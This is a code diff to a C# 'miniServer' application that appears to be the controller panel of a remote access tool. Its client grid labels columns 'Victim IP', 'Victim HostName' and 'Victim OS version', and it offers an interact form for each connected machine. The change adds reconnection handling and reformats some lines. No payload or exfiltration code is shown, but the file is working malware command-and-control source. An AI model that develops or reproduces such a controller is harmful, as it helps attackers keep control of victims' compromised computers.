@@ -133,11 +133,20 @@ namespace miniServer
 
         void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
         {
+            miniClient mc = clientList?.Where(e => e.ID.ToString() == incomming.Split(new string[] { separator }, StringSplitOptions.None)[0].ToString()).FirstOrDefault();
             idMutex.WaitOne();
-            miniClient mc = new miniClient(Guid.NewGuid(), tcpClient, os, version, hostName);
-            clientList.Add(mc);
-            idMutex.ReleaseMutex();
+            if (mc == null)
+            {
+                mc = new miniClient(Guid.NewGuid(), tcpClient, os, version, hostName);
+                clientList.Add(mc);
+                //idMutex.ReleaseMutex();
+            }
+            else
+            {
+                mc.RenewConnection(tcpClient);
+            }
 
+            idMutex.ReleaseMutex();
             //Hello is for future use
             mc.SendToClient(mc.ID.ToString() + separator + "Hello");
 
@@ -153,14 +162,33 @@ namespace miniServer
             row.Cells[5].Value = mc.OS;//Victim OS version
             row.Cells[6].Value = mc.Version;//Client Version
             row.Cells[7].Value = "Yes";//isAlive
-
+            string ConnectionStatus=string.Empty;
             gridMutex.WaitOne();
             dataGridViewClients.Invoke((MethodInvoker)delegate
             {
-                dataGridViewClients.Rows.Add(row);
+                var existRow = dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault();
+                if (existRow == null)
+                {
+                    dataGridViewClients.Rows.Add(row);
+                    ConnectionStatus = "Connected";
+                }
+                else
+                {
+                    existRow.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
+                    existRow.Cells[1].Value = mc.ID;//ID
+                    existRow.Cells[2].Value = mc.Note; //Note 
+                    existRow.Cells[3].Value = mc.IP;//Victim IP and 
+                    existRow.Cells[4].Value = mc.HostName;//Victim HostName
+                    existRow.Cells[5].Value = mc.OS;//Victim OS version
+                    existRow.Cells[6].Value = mc.Version;//Client Version
+                    existRow.Cells[7].Value = "Yes";//isAlive
+                    ConnectionStatus = "ReConnected";
+                }
             });
+
+
             gridMutex.ReleaseMutex();
-            writelog(mc.IP + " -> Connected :) : " + incomming.Replace(incomming.Split(new string[]{ separator},StringSplitOptions.None)[0],mc.ID.ToString()), "");
+            writelog(mc.IP + " -> "+ConnectionStatus+" :) : " + incomming.Replace(incomming.Split(new string[] { separator }, StringSplitOptions.None)[0], mc.ID.ToString()), "");
         }
 
         void writelog(string log, string extradata)
@@ -175,7 +203,8 @@ namespace miniServer
                 });
                 return;
             }
-            else {
+            else
+            {
                 richTextBoxLog.Invoke((MethodInvoker)delegate
                 {
                     richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n").Replace(separator, "_");
@@ -200,14 +229,14 @@ namespace miniServer
 
         private void openInteractForm()
         {
-            if(dataGridViewClients.CurrentCell != null)
+            if (dataGridViewClients.CurrentCell != null)
             {
                 Guid id = (Guid)dataGridViewClients.CurrentRow.Cells[1].Value;
 
                 if (clientList.Where(e => e.ID == id).FirstOrDefault().Interact)
                 {
-                   // if (disableOpenWarningToolStripMenuItem.Checked)
-                        MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
+                    // if (disableOpenWarningToolStripMenuItem.Checked)
+                    MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                     foreach (Form frm in Application.OpenForms)
                         if (frm.Name == "InteractForm")
@@ -243,7 +272,7 @@ namespace miniServer
                 if (dataGridViewClients.CurrentCell != null)
                 {
                     Guid id = (Guid)dataGridViewClients.CurrentRow.Cells["id"].Value;//id
-                    editNoteForm editFrm = new editNoteForm(clientList.Where(r=>r.ID==id).FirstOrDefault().Note);
+                    editNoteForm editFrm = new editNoteForm(clientList.Where(r => r.ID == id).FirstOrDefault().Note);
                     editFrm.ShowDialog();
                     clientList.Where(r => r.ID == id).FirstOrDefault().Note = editFrm.note;
                     dataGridViewClients.CurrentRow.Cells["note"].Value = editFrm.note;
@@ -330,7 +359,8 @@ namespace miniServer
                         wait++;
                     }
                     throw new Exception(" Don't response to version command.");
-                }catch(Exception ex)
+                }
+                catch (Exception ex)
                 {
                     mc.IsAlive = false;
                     mc.client.Close();
